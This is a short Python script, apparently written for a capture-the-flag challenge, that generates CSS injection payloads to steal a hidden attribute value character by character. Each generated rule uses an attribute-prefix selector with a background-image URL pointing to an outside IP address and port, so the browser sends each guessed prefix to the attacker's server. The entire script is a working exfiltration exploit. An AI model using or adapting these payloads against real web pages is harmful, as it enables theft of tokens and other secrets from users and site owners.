#!/usr/bin/env python3
import string

charset = string.ascii_letters + string.digits

flag = 'l0l1nj3ctc55'  # update this value after every request we receive
index = len(flag)

# check if starts with the combination
for ch in charset:
	print('''
    .flag[value^=A] {
        background-image: url(http://220.255.192.228:8081/flagB=A);
    }
    '''.replace('B', str(index)).replace('A', flag+ch).strip())

# check if flag is the final flag itself
print('''
.flag[value=A] {
    background-image: url(http://220.255.192.228:8081/flagB=A);
}
'''.replace('B', '_final').replace('A', flag).strip())